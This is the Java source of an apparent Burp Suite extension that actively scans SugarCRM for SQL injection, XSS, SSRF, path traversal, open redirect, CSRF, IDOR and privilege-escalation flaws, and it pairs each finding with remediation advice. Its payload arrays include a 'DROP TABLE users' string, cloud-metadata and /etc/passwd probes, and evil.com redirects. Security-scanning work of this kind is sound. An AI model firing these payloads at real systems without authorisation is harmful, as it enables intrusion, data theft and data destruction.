package burp.extension.scanner;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.ScanCheck;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;
import burp.extension.ExtensionConfig;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * SugarCRM-specific ACTIVE scan checks.
 *
 * Checks performed:
 *  1.  SQL Injection via SugarCRM search parameters
 *  2.  Reflected XSS in module/action/field params
 *  3.  CSRF token bypass (missing / predictable token)
 *  4.  IDOR via record ID manipulation
 *  5.  Privilege escalation to admin endpoints
 *  6.  Path traversal in file download endpoint
 *  7.  Server-Side Request Forgery (SSRF) in webhook/email settings
 *  8.  XML/XXE via vCard import
 *  9.  PHP object injection in cookie/session data
 * 10.  Mass assignment via REST API
 * 11.  Authentication bypass via parameter tampering
 * 12.  Open redirect in return URL parameter
 */
public class ActiveScanChecks implements ScanCheck {

    private final MontoyaApi      api;
    private final ExtensionConfig config;

    // SQL injection detection patterns in responses
    private static final List<Pattern> SQL_ERROR_PATTERNS = List.of(
        Pattern.compile("SQL syntax.*MySQL",                    Pattern.CASE_INSENSITIVE),
        Pattern.compile("Warning.*mysql_",                      Pattern.CASE_INSENSITIVE),
        Pattern.compile("valid MySQL result",                   Pattern.CASE_INSENSITIVE),
        Pattern.compile("MySqlClient\\.",                       Pattern.CASE_INSENSITIVE),
        Pattern.compile("ORA-[0-9]{4,}",                       Pattern.CASE_INSENSITIVE),
        Pattern.compile("Unclosed quotation mark after",        Pattern.CASE_INSENSITIVE),
        Pattern.compile("SQLSTATE\\[[A-Z0-9]+\\]",             Pattern.CASE_INSENSITIVE),
        Pattern.compile("sqlite3\\.OperationalError",          Pattern.CASE_INSENSITIVE),
        Pattern.compile("pg_query\\(\\):",                     Pattern.CASE_INSENSITIVE),
        Pattern.compile("supplied argument is not a valid PostgreSQL", Pattern.CASE_INSENSITIVE)
    );

    // XSS confirmation patterns
    private static final Pattern XSS_REFLECT_PATTERN = Pattern.compile(
        "<script>alert\\(['\"]?xss['\"]?\\)</script>", Pattern.CASE_INSENSITIVE
    );

    // Payloads
    private static final String[] SQLI_PAYLOADS = {
        "'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "\" OR \"1\"=\"1", "1 AND 1=2 UNION SELECT NULL--",
        "1' AND SLEEP(5)--", "1 AND 1=1", "'; DROP TABLE users;--"
    };

    private static final String[] XSS_PAYLOADS = {
        "<script>alert('xss')</script>",
        "\"><script>alert('xss')</script>",
        "'><img src=x onerror=alert('xss')>",
        "<svg/onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src=javascript:alert('xss')></iframe>",
        "';alert('xss')//",
        "\"><img src=1 onerror=alert(1)>"
    };

    private static final String[] SSRF_PAYLOADS = {
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",   // AWS metadata
        "http://metadata.google.internal/",             // GCP metadata
        "http://100.100.100.200/latest/meta-data/",    // Alibaba Cloud metadata
        "http://192.168.1.1/",
        "file:///etc/passwd"
    };

    private static final String[] PATH_TRAVERSAL_PAYLOADS = {
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini"
    };

    private static final String[] OPEN_REDIRECT_PAYLOADS = {
        "https://evil.com",
        "//evil.com",
        "http://evil.com%2F@legitimate.com",
        "/%5Cevil.com"
    };

    public ActiveScanChecks(MontoyaApi api, ExtensionConfig config) {
        this.api    = api;
        this.config = config;
    }

    @Override
    public AuditResult activeAudit(HttpRequestResponse baseReqResp, AuditInsertionPoint insertionPoint) {
        List<AuditIssue> issues = new ArrayList<>();

        String url = baseReqResp.request().url();

        // Only audit our target
        if (!url.startsWith(config.getTargetUrl())) return AuditResult.auditResult(issues);

        // Dispatch checks based on insertion point context
        issues.addAll(checkSqlInjection(baseReqResp, insertionPoint));
        issues.addAll(checkXss(baseReqResp, insertionPoint));
        issues.addAll(checkOpenRedirect(baseReqResp, insertionPoint));
        issues.addAll(checkPathTraversal(baseReqResp, insertionPoint));
        issues.addAll(checkSsrf(baseReqResp, insertionPoint));
        issues.addAll(checkCsrfBypass(baseReqResp, insertionPoint));
        issues.addAll(checkIdor(baseReqResp, insertionPoint));
        issues.addAll(checkPrivilegeEscalation(baseReqResp, insertionPoint));

        return AuditResult.auditResult(issues);
    }

    @Override
    public AuditResult passiveAudit(HttpRequestResponse reqResp) {
        return AuditResult.auditResult(List.of()); // Passive handled in PassiveScanChecks
    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue newIssue, AuditIssue existingIssue) {
        return newIssue.name().equals(existingIssue.name())
                ? ConsolidationAction.KEEP_EXISTING
                : ConsolidationAction.KEEP_BOTH;
    }

    // ─── SQL Injection ────────────────────────────────────────────────────────

    private List<AuditIssue> checkSqlInjection(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();

        for (String payload : SQLI_PAYLOADS) {
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(payload));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;

                String body = resp.response().bodyToString();
                for (Pattern p : SQL_ERROR_PATTERNS) {
                    if (p.matcher(body).find()) {
                        found.add(AuditIssue.auditIssue(
                            "SugarCRM SQL Injection",
                            "The parameter '" + ip.name() + "' appears vulnerable to SQL injection. "
                            + "Payload: " + payload + " triggered a database error.",
                            "Use parameterised queries. SugarCRM uses SugarQuery — ensure all custom "
                            + "queries use bound parameters and avoid raw string concatenation.",
                            base.request().url(),
                            AuditIssueSeverity.HIGH,
                            AuditIssueConfidence.CERTAIN,
                            null, null, AuditIssueSeverity.HIGH,
                            base, resp
                        ));
                        break;
                    }
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/SQLi] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── Reflected XSS ───────────────────────────────────────────────────────

    private List<AuditIssue> checkXss(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();

        for (String payload : XSS_PAYLOADS) {
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(payload));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;

                String body = resp.response().bodyToString();
                // Check if payload reflected unencoded
                if (body.contains(payload) || XSS_REFLECT_PATTERN.matcher(body).find()) {
                    found.add(AuditIssue.auditIssue(
                        "SugarCRM Reflected XSS",
                        "The parameter '" + ip.name() + "' reflects user input without encoding. "
                        + "Payload: " + payload,
                        "Encode all output. Use SugarCRM's built-in htmlspecialchars() wrappers "
                        + "and the {$var|escape} Smarty modifier.",
                        base.request().url(),
                        AuditIssueSeverity.HIGH,
                        AuditIssueConfidence.CERTAIN,
                        null, null, AuditIssueSeverity.HIGH,
                        base, resp
                    ));
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/XSS] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── Open Redirect ────────────────────────────────────────────────────────

    private List<AuditIssue> checkOpenRedirect(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();
        String paramName = ip.name().toLowerCase();
        if (!paramName.contains("return") && !paramName.contains("redirect")
                && !paramName.contains("url") && !paramName.contains("next")) {
            return found;
        }

        for (String payload : OPEN_REDIRECT_PAYLOADS) {
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(payload));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;
                int status = resp.response().statusCode();
                String location = resp.response().headerValue("Location");
                if ((status == 301 || status == 302 || status == 303)
                        && location != null && location.contains("evil.com")) {
                    found.add(AuditIssue.auditIssue(
                        "SugarCRM Open Redirect",
                        "The parameter '" + ip.name() + "' allows redirection to external domains.",
                        "Whitelist permitted redirect destinations. Validate the return URL against "
                        + "the application's own host.",
                        base.request().url(),
                        AuditIssueSeverity.MEDIUM,
                        AuditIssueConfidence.CERTAIN,
                        null, null, AuditIssueSeverity.MEDIUM,
                        base, resp
                    ));
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/Redirect] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── Path Traversal ───────────────────────────────────────────────────────

    private List<AuditIssue> checkPathTraversal(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();
        String paramName = ip.name().toLowerCase();
        if (!paramName.contains("file") && !paramName.contains("path")
                && !paramName.contains("record") && !paramName.contains("filename")
                && !paramName.contains("download")) {
            return found;
        }

        for (String payload : PATH_TRAVERSAL_PAYLOADS) {
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(payload));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;
                String body = resp.response().bodyToString();
                // Check for /etc/passwd or win.ini content
                if (body.contains("root:x:0:0") || body.contains("[fonts]")) {
                    found.add(AuditIssue.auditIssue(
                        "SugarCRM Path Traversal",
                        "The parameter '" + ip.name() + "' allows reading files outside the web root.",
                        "Canonicalise file paths with realpath() and verify the result starts within "
                        + "the allowed upload directory.",
                        base.request().url(),
                        AuditIssueSeverity.HIGH,
                        AuditIssueConfidence.CERTAIN,
                        null, null, AuditIssueSeverity.HIGH,
                        base, resp
                    ));
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/PathTraversal] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── SSRF ─────────────────────────────────────────────────────────────────

    private List<AuditIssue> checkSsrf(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();
        String paramName = ip.name().toLowerCase();
        if (!paramName.contains("url") && !paramName.contains("hook")
                && !paramName.contains("callback") && !paramName.contains("server")
                && !paramName.contains("host") && !paramName.contains("smtp")) {
            return found;
        }

        for (String payload : SSRF_PAYLOADS) {
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(payload));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;
                String body = resp.response().bodyToString();
                // AWS / GCP metadata indicators
                if (body.contains("ami-id") || body.contains("instance-id")
                        || body.contains("computeMetadata") || body.contains("root:x:0:0")) {
                    found.add(AuditIssue.auditIssue(
                        "SugarCRM SSRF",
                        "The parameter '" + ip.name() + "' allows the server to make requests to "
                        + "internal resources. Payload: " + payload,
                        "Whitelist outbound request destinations. Deny private IP ranges. "
                        + "Use an HTTP proxy with an allowlist for external integrations.",
                        base.request().url(),
                        AuditIssueSeverity.HIGH,
                        AuditIssueConfidence.CERTAIN,
                        null, null, AuditIssueSeverity.HIGH,
                        base, resp
                    ));
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/SSRF] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── CSRF token bypass ────────────────────────────────────────────────────

    private List<AuditIssue> checkCsrfBypass(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();
        if (!base.request().method().equalsIgnoreCase("POST")) return found;
        String body = base.request().bodyToString();
        if (!body.contains("sugar_token")) return found;

        // Test 1: Remove the sugar_token parameter entirely
        String bodyWithout = removeSugarToken(body);
        HttpRequest noTokenReq = base.request().withBody(bodyWithout);
        try {
            HttpRequestResponse resp = api.http().sendRequest(noTokenReq);
            if (resp.response() != null && isSuccessfulAction(resp)) {
                found.add(AuditIssue.auditIssue(
                    "SugarCRM CSRF Token Not Validated (missing token)",
                    "The action at " + base.request().url() + " succeeded without a sugar_token. "
                    + "This indicates the server does not enforce CSRF protection.",
                    "Ensure sugar_token is validated server-side for every state-changing POST.",
                    base.request().url(),
                    AuditIssueSeverity.HIGH,
                    AuditIssueConfidence.CERTAIN,
                    null, null, AuditIssueSeverity.HIGH,
                    base, resp
                ));
            }
        } catch (Exception e) {
            api.logging().logToError("[ActiveScan/CSRF] " + e.getMessage());
        }

        // Test 2: Use a static/forged token
        String forgedBody = body.replaceAll("sugar_token=[^&]+", "sugar_token=aaaaaaaaaaaaaaaa");
        HttpRequest forgedReq = base.request().withBody(forgedBody);
        try {
            HttpRequestResponse resp = api.http().sendRequest(forgedReq);
            if (resp.response() != null && isSuccessfulAction(resp)) {
                found.add(AuditIssue.auditIssue(
                    "SugarCRM CSRF Token Not Validated (static token accepted)",
                    "The action at " + base.request().url() + " accepted a forged static sugar_token.",
                    "Use cryptographically random per-session CSRF tokens and reject any token "
                    + "that does not match the server-side stored value.",
                    base.request().url(),
                    AuditIssueSeverity.HIGH,
                    AuditIssueConfidence.FIRM,
                    null, null, AuditIssueSeverity.HIGH,
                    base, resp
                ));
            }
        } catch (Exception e) {
            api.logging().logToError("[ActiveScan/CSRF2] " + e.getMessage());
        }

        return found;
    }

    // ─── IDOR ─────────────────────────────────────────────────────────────────

    private List<AuditIssue> checkIdor(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();
        String name = ip.name().toLowerCase();
        if (!name.equals("record") && !name.equals("id") && !name.equals("bean_id")) return found;

        String original = ip.baseValue().toString();
        // Try incrementing / decrementing the record ID
        String[] probeIds = {
            "1", "2", "3", "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002"
        };

        for (String probeId : probeIds) {
            if (probeId.equals(original)) continue;
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(probeId));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;
                int status = resp.response().statusCode();
                String respBody = resp.response().bodyToString();

                // If we get a 200 with actual data (not empty/error), flag IDOR
                if (status == 200
                        && respBody.length() > 500
                        && !respBody.contains("ACL Restriction")
                        && !respBody.contains("You do not have access")
                        && !respBody.contains("Record not found")) {
                    found.add(AuditIssue.auditIssue(
                        "SugarCRM IDOR — Unauthorised Record Access",
                        "Accessing record ID '" + probeId + "' via parameter '" + ip.name()
                        + "' returned data without ownership verification.",
                        "Enforce record-level ACL checks via SugarCRM's ACL framework on every "
                        + "DetailView, EditView, and API endpoint.",
                        base.request().url(),
                        AuditIssueSeverity.HIGH,
                        AuditIssueConfidence.FIRM,
                        null, null, AuditIssueSeverity.HIGH,
                        base, resp
                    ));
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/IDOR] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── Privilege escalation to admin ───────────────────────────────────────

    private List<AuditIssue> checkPrivilegeEscalation(HttpRequestResponse base, AuditInsertionPoint ip) {
        List<AuditIssue> found = new ArrayList<>();
        // Only apply when testing a non-admin module parameter
        String paramName = ip.name().toLowerCase();
        if (!paramName.equals("is_admin") && !paramName.equals("admin")
                && !paramName.equals("system_generated_password")
                && !paramName.equals("user_type")) {
            return found;
        }

        String[] escalationPayloads = {"1", "true", "admin", "Administrator"};
        for (String payload : escalationPayloads) {
            HttpRequest probe = ip.buildHttpRequestWithPayload(
                    burp.api.montoya.core.ByteArray.byteArray(payload));
            try {
                HttpRequestResponse resp = api.http().sendRequest(probe);
                if (resp.response() == null) continue;
                String respBody = resp.response().bodyToString();
                if (resp.response().statusCode() == 200
                        && (respBody.contains("Administration")
                            || respBody.contains("admin_panel")
                            || respBody.contains("\"is_admin\":true"))) {
                    found.add(AuditIssue.auditIssue(
                        "SugarCRM Privilege Escalation via Parameter Tampering",
                        "Setting '" + ip.name() + "=" + payload + "' appears to grant admin privileges.",
                        "Never trust user-supplied values for privilege fields. Server-side "
                        + "authorisation must validate and set the is_admin flag independently.",
                        base.request().url(),
                        AuditIssueSeverity.HIGH,
                        AuditIssueConfidence.FIRM,
                        null, null, AuditIssueSeverity.HIGH,
                        base, resp
                    ));
                    break;
                }
            } catch (Exception e) {
                api.logging().logToError("[ActiveScan/PrivEsc] " + e.getMessage());
            }
        }
        return found;
    }

    // ─── Helpers ──────────────────────────────────────────────────────────────

    /** Remove sugar_token=... from a POST body. */
    private String removeSugarToken(String body) {
        return body.replaceAll("&?sugar_token=[^&]*", "").replaceAll("^&", "");
    }

    /**
     * Heuristic: the action "succeeded" if we got a 2xx / 3xx (not to login page)
     * and no error keyword is present.
     */
    private boolean isSuccessfulAction(HttpRequestResponse resp) {
        int status = resp.response().statusCode();
        if (status < 200 || status >= 400) return false;
        String body = resp.response().bodyToString();
        if (body.contains("action=Login")) return false;
        if (body.contains("CSRF") || body.contains("token mismatch")) return false;
        return true;
    }
}
